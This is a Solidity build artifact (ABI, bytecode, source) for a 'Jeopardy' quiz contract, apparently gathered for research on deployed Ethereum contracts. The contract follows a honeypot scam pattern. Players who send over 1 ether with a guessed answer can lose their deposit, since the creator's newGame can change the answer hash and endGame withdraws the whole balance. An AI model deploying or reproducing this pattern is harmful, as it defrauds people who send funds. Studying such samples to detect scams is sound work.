{
  "contractName": "Jeopardy",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "answer",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "response",
          "type": "string"
        }
      ],
      "name": "startGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "endGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "newGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506106d9806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063044c96e41461006f5780633853682c146101115780636cbc2ded1461016d578063780aee7314610177578063c8166a8a146101e1575b005b61010f600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610271565b005b61016b600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061034d565b005b610175610436565b005b6101df600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929080356000191690602001909291905050506104ed565b005b3480156101ed57600080fd5b506101f661056a565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561023657808201518184015260208101905061021b565b50505050905090810190601f1680156102635780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b600060010260005460001916141561034957806040518082805190602001908083835b6020831015156102b95780518252602082019150602081019050602083039250610294565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600081600019169055508160019080519060200190610306929190610608565b5033600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b806040518082805190602001908083835b602083101515610383578051825260208201915060208101905060208303925061035e565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060001916600054600019161480156103cf5750670de0b6b3a764000034115b15610433573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610431573d6000803e3d6000fd5b505b50565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156104eb573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156104e9573d6000803e3d6000fd5b505b565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415610566578160019080519060200190610559929190610608565b5080600081600019169055505b5050565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106005780601f106105d557610100808354040283529160200191610600565b820191906000526020600020905b8154815290600101906020018083116105e357829003601f168201915b505050505081565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061064957805160ff1916838001178555610677565b82800160010185558215610677579182015b8281111561067657825182559160200191906001019061065b565b5b5090506106849190610688565b5090565b6106aa91905b808211156106a657600081600090555060010161068e565b5090565b905600a165627a7a723058204f34c58d642a112d6009a8d055c11d33c875ab66aa1ca21c965ef3a15d5c8b720029",
  "source": "\n\ncontract Jeopardy\n{\n    bytes32 responseHash;\n    string public Question;\n    address questionSender;\n\n    function Try(string answer)\n    public payable {\n        if (responseHash == keccak256(answer) && msg.value > 1 ether) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n \n    function startGame(string question, string response)\n    public payable {\n        if (responseHash == 0x0) {\n            responseHash = keccak256(response);\n            Question = question;\n            questionSender = msg.sender;\n        }\n    }\n\n    function endGame()\n    public payable {\n        if (msg.sender == questionSender) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    function newGame(string question, bytes32 _responseHash)\n    public payable {\n        if (msg.sender == questionSender) {\n            Question = question;\n            responseHash = _responseHash;\n        }\n    }\n    \n    function () payable public {}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x064656852581472f9b315fea4730fe18fb7c579a/contracts/0x064656852581472f9b315fea4730fe18fb7c579a.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:45:08.379Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}